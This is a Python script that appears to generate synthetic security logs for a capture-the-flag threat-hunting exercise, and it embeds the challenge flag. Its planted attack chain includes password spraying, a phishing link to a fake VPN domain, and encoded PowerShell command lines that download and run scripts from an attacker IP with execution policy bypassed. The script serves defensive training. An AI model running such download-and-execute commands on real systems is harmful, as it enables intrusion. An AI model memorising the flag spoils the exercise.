import base64
import csv
import os
import random
from datetime import datetime, timedelta

SEED = 2027
random.seed(SEED)
os.makedirs("data", exist_ok=True)

START = datetime(2026, 9, 4, 8, 0, 0)

ATTACKER_IP = "185.22.54.9"
PHISH_DOMAIN = "secure-vpn-update.example"

CLOUD_COMPROMISED_USER = "alice"
PHISH_RECIPIENT = "bob"
PHISH_DEVICE = "FIN-PC01"
PHISH_DEVICE_IP = "10.0.0.31"
LATERAL_TARGET = "FILESERVER01"

USERS = [
    "alice", "bob", "carol", "dave", "eve", "frank", "grace", "heidi",
    "ivan", "judy", "mallory", "oscar", "peggy", "trent", "victor",
    "walter", "yvonne", "zara", "nick", "lisa", "mark", "anna",
    "tom", "peter", "john", "maria", "sara", "daniel", "robert"
]

DEVICES = [
    "HR-PC01", "HR-PC02", "FIN-PC01", "FIN-PC02", "DEV-PC01", "DEV-PC02",
    "DEV-PC03", "ENG-PC01", "ENG-PC02", "FILESERVER01", "PRINT01"
]

DEVICE_IPS = {
    "HR-PC01": "10.0.0.23",
    "HR-PC02": "10.0.0.24",
    "FIN-PC01": "10.0.0.31",
    "FIN-PC02": "10.0.0.32",
    "DEV-PC01": "10.0.0.41",
    "DEV-PC02": "10.0.0.42",
    "DEV-PC03": "10.0.0.43",
    "ENG-PC01": "10.0.0.51",
    "ENG-PC02": "10.0.0.52",
    "FILESERVER01": "10.0.0.10",
    "PRINT01": "10.0.0.60",
}

NORMAL_USER_HOST = {
    "alice": "HR-PC01",
    "bob": "FIN-PC01",
    "carol": "DEV-PC01",
    "dave": "DEV-PC02",
    "eve": "ENG-PC01",
    "frank": "ENG-PC02",
}


def iso(ts):
    return ts.isoformat(timespec="seconds")


def ps_b64(command):
    """PowerShell -EncodedCommand uses UTF-16LE before Base64 encoding."""
    return base64.b64encode(command.encode("utf-16le")).decode()


def write_csv(name, header, rows):
    path = f"data/{name}.csv"
    with open(path, "w", newline="", encoding="utf-8") as handle:
        writer = csv.writer(handle)
        writer.writerow(header)
        writer.writerows(sorted(rows, key=lambda row: row[0]))
    print(f"wrote {path}: {len(rows)} rows")


def generate_signin_logs():
    rows = []
    locations = ["NO", "NO", "NO", "SE", "DK", "DE"]
    apps = ["Microsoft 365", "Teams", "SharePoint", "Azure Portal"]
    office_ips = [f"10.20.5.{i}" for i in range(10, 70)]

    for i in range(2200):
        ts = START + timedelta(seconds=i * 7)
        user = random.choice(USERS)
        result = "Failed" if random.random() < 0.035 else "Success"
        rows.append([
            iso(ts), user, random.choice(office_ips), result,
            random.choice(locations), random.choice(apps)
        ])

    spray_start = START + timedelta(minutes=18)
    sprayed_users = USERS[:18]
    for i in range(90):
        rows.append([
            iso(spray_start + timedelta(seconds=i * 3)),
            sprayed_users[i % len(sprayed_users)],
            ATTACKER_IP,
            "Failed",
            "RU",
            "Microsoft 365",
        ])

    brute_start = START + timedelta(minutes=24)
    for i in range(46):
        rows.append([
            iso(brute_start + timedelta(seconds=i * 2)),
            CLOUD_COMPROMISED_USER,
            ATTACKER_IP,
            "Failed",
            "RU",
            "Microsoft 365",
        ])

    rows.append([
        iso(brute_start + timedelta(seconds=95)),
        CLOUD_COMPROMISED_USER,
        ATTACKER_IP,
        "Success",
        "RU",
        "Microsoft 365",
    ])

    write_csv(
        "SigninLogs",
        ["Timestamp", "User", "IPAddress", "ResultType", "Location", "Application"],
        rows,
    )


def generate_email_events():
    rows = []
    subjects = [
        "Quarterly planning notes",
        "Lunch order",
        "Project status",
        "Updated spreadsheet",
        "Meeting moved",
        "Travel request",
        "Budget review",
        "Team photos",
        "Timesheet reminder",
        "Benefits information",
    ]
    domains = [
        "https://intranet.example",
        "https://sharepoint.example",
        "https://teams.example",
        "https://hr.example",
        "",
    ]

    for i in range(1300):
        ts = START + timedelta(seconds=i * 11)
        sender = random.choice(USERS)
        recipient = random.choice([u for u in USERS if u != sender])
        attachment = random.choice(["", "", "", "notes.docx", "report.xlsx", "agenda.pdf"])
        url = random.choice(domains)
        rows.append([
            iso(ts),
            f"{sender}@corp.example",
            f"{recipient}@corp.example",
            random.choice(subjects),
            "Delivered",
            url,
            attachment,
            f"MSG-{100000 + i}",
        ])

    phish_time = START + timedelta(minutes=27, seconds=10)
    rows.append([
        iso(phish_time),
        "alice@corp.example",
        "bob@corp.example",
        "Updated VPN access instructions",
        "Delivered",
        f"https://{PHISH_DOMAIN}/vpn",
        "",
        "MSG-900001",
    ])

    rows.extend([
        [
            iso(phish_time - timedelta(seconds=51)),
            "alice@corp.example",
            "carol@corp.example",
            "Re: Quarterly planning notes",
            "Delivered",
            "https://sharepoint.example",
            "",
            "MSG-900000",
        ],
        [
            iso(phish_time + timedelta(minutes=2, seconds=3)),
            "alice@corp.example",
            "dave@corp.example",
            "Lunch order",
            "Delivered",
            "",
            "",
            "MSG-900002",
        ],
    ])

    write_csv(
        "EmailEvents",
        ["Timestamp", "Sender", "Recipient", "Subject", "DeliveryAction", "Url", "AttachmentName", "MessageId"],
        rows,
    )


def generate_logon_events():
    rows = []
    logon_types = ["Interactive", "Network", "Service", "Batch"]

    for i in range(3500):
        ts = START + timedelta(seconds=i * 5)
        user = random.choice(USERS)
        device = NORMAL_USER_HOST.get(user, random.choice(DEVICES))
        remote_ip = random.choice(list(DEVICE_IPS.values()))
        rows.append([
            iso(ts), device, user, random.choice(logon_types), remote_ip, "LogonSuccess"
        ])

    for minute in range(10, 220, 17):
        rows.append([
            iso(START + timedelta(minutes=minute)),
            "FILESERVER01",
            "svc_backup",
            "Service",
            "10.0.0.5",
            "LogonSuccess",
        ])

   
    lateral = START + timedelta(minutes=34, seconds=10)
    rows.extend([
        [
            iso(lateral),
            "FILESERVER01",
            PHISH_RECIPIENT,
            "RemoteInteractive",
            PHISH_DEVICE_IP,
            "LogonSuccess",
        ],
        [
            iso(lateral + timedelta(seconds=20)),
            "FILESERVER01",
            PHISH_RECIPIENT,
            "Network",
            PHISH_DEVICE_IP,
            "LogonSuccess",
        ],
    ])

    write_csv(
        "DeviceLogonEvents",
        ["Timestamp", "DeviceName", "AccountName", "LogonType", "RemoteIP", "ActionType"],
        rows,
    )


def generate_process_events():
    rows = []
    normal_processes = [
        ("explorer.exe", "explorer.exe", "userinit.exe"),
        ("chrome.exe", "chrome.exe --type=renderer", "explorer.exe"),
        ("msedge.exe", "msedge.exe --type=renderer", "explorer.exe"),
        ("teams.exe", "teams.exe --process-start-args", "explorer.exe"),
        ("outlook.exe", "outlook.exe /recycle", "explorer.exe"),
        ("svchost.exe", "svchost.exe -k netsvcs", "services.exe"),
    ]

    for i in range(6000):
        ts = START + timedelta(seconds=i * 3)
        device = random.choice(DEVICES)
        account = random.choice(USERS)
        process, cmdline, parent = random.choice(normal_processes)
        rows.append([iso(ts), device, account, process, cmdline, parent])

    legitimate_ps = [
        "powershell.exe -NoProfile -Command Get-Process",
        "powershell.exe -NoProfile -Command Get-Service",
        "powershell.exe -NoProfile -Command Get-ChildItem C:\\Temp",
        "powershell.exe -NoProfile -Command Get-Date",
    ]
    for i in range(75):
        rows.append([
            iso(START + timedelta(minutes=5 + i * 2)),
            random.choice(DEVICES),
            random.choice(USERS),
            "powershell.exe",
            random.choice(legitimate_ps),
            random.choice(["explorer.exe", "cmd.exe", "taskeng.exe"]),
        ])

    phish_exec = START + timedelta(minutes=28, seconds=2)
    stage1 = (
        "$u='https://secure-vpn-update.example/files/vpn-update.ps1';"
        "Invoke-WebRequest $u -OutFile C:\\Users\\bob\\Downloads\\vpn-update.ps1"
    )

    rows.extend([
        [
            iso(phish_exec),
            PHISH_DEVICE,
            PHISH_RECIPIENT,
            "msedge.exe",
            f'msedge.exe --single-argument https://{PHISH_DOMAIN}/vpn',
            "outlook.exe",
        ],
        [
            iso(phish_exec + timedelta(seconds=13)),
            PHISH_DEVICE,
            PHISH_RECIPIENT,
            "powershell.exe",
            f"powershell.exe -NoProfile -EncodedCommand {ps_b64(stage1)}",
            "msedge.exe",
        ],
        [
            iso(phish_exec + timedelta(seconds=31)),
            PHISH_DEVICE,
            PHISH_RECIPIENT,
            "powershell.exe",
            "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\bob\\Downloads\\vpn-update.ps1",
            "explorer.exe",
        ],
        [
            iso(phish_exec + timedelta(seconds=48)),
            PHISH_DEVICE,
            PHISH_RECIPIENT,
            "cmd.exe",
            "cmd.exe /c whoami && hostname",
            "powershell.exe",
        ],
    ])

    server_stage = START + timedelta(minutes=34, seconds=42)
    server_download = (
        "$u='http://185.22.54.9/assets/healthcheck.ps1';"
        "Invoke-WebRequest $u -OutFile C:\\ProgramData\\healthcheck.ps1"
    )

    flag = "CTFkom{cl0ud_m41l_3ndp01nt_p1v0t_2027}"
    flag_b64 = base64.b64encode(flag.encode()).decode()
    final_command = (
        "$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"
        + flag_b64
        + "'));Write-Output $d"
    )

    rows.extend([
        [
            iso(server_stage),
            LATERAL_TARGET,
            PHISH_RECIPIENT,
            "cmd.exe",
            "cmd.exe /c whoami",
            "wsmprovhost.exe",
        ],
        [
            iso(server_stage + timedelta(seconds=8)),
            LATERAL_TARGET,
            PHISH_RECIPIENT,
            "powershell.exe",
            f"powershell.exe -NoProfile -EncodedCommand {ps_b64(server_download)}",
            "cmd.exe",
        ],
        [
            iso(server_stage + timedelta(seconds=22)),
            LATERAL_TARGET,
            PHISH_RECIPIENT,
            "powershell.exe",
            "powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\healthcheck.ps1",
            "cmd.exe",
        ],
        [
            iso(server_stage + timedelta(seconds=39)),
            LATERAL_TARGET,
            PHISH_RECIPIENT,
            "powershell.exe",
            f"powershell.exe -NoProfile -EncodedCommand {ps_b64(final_command)}",
            "cmd.exe",
        ],
    ])

    write_csv(
        "DeviceProcessEvents",
        ["Timestamp", "DeviceName", "AccountName", "ProcessName", "ProcessCommandLine", "ParentProcessName"],
        rows,
    )


def generate_network_events():
    rows = []
    normal_destinations = [
        ("13.107.42.14", 443, "https://teams.microsoft.com"),
        ("20.190.128.10", 443, "https://login.microsoftonline.com"),
        ("142.250.74.14", 443, "https://www.google.com"),
        ("151.101.1.69", 443, "https://stackoverflow.com"),
        ("10.0.0.10", 445, "smb://FILESERVER01"),
    ]

    for i in range(3200):
        ts = START + timedelta(seconds=i * 6)
        device = random.choice(DEVICES)
        user = random.choice(USERS)
        remote_ip, port, url = random.choice(normal_destinations)
        process = random.choice(["chrome.exe", "msedge.exe", "teams.exe", "outlook.exe", "svchost.exe"])
        rows.append([iso(ts), device, user, process, remote_ip, port, url, "ConnectionSuccess"])

 
    phish_net = START + timedelta(minutes=28, seconds=3)
    rows.extend([
        [
            iso(phish_net),
            PHISH_DEVICE,
            PHISH_RECIPIENT,
            "msedge.exe",
            ATTACKER_IP,
            443,
            f"https://{PHISH_DOMAIN}/vpn",
            "ConnectionSuccess",
        ],
        [
            iso(phish_net + timedelta(seconds=14)),
            PHISH_DEVICE,
            PHISH_RECIPIENT,
            "powershell.exe",
            ATTACKER_IP,
            443,
            f"https://{PHISH_DOMAIN}/files/vpn-update.ps1",
            "ConnectionSuccess",
        ],
    ])

    server_net = START + timedelta(minutes=34, seconds=52)
    rows.extend([
        [
            iso(server_net),
            LATERAL_TARGET,
            PHISH_RECIPIENT,
            "powershell.exe",
            ATTACKER_IP,
            80,
            "http://185.22.54.9/assets/healthcheck.ps1",
            "ConnectionSuccess",
        ],
        [
            iso(server_net + timedelta(seconds=29)),
            LATERAL_TARGET,
            PHISH_RECIPIENT,
            "powershell.exe",
            ATTACKER_IP,
            443,
            "https://185.22.54.9/api/status",
            "ConnectionSuccess",
        ],
    ])

    write_csv(
        "DeviceNetworkEvents",
        ["Timestamp", "DeviceName", "AccountName", "InitiatingProcessFileName", "RemoteIP", "RemotePort", "RemoteUrl", "ActionType"],
        rows,
    )


def main():
    generate_signin_logs()
    generate_email_events()
    generate_logon_events()
    generate_process_events()
    generate_network_events()
    print(f"logs generated with deterministic seed {SEED}")


if __name__ == "__main__":
    main()
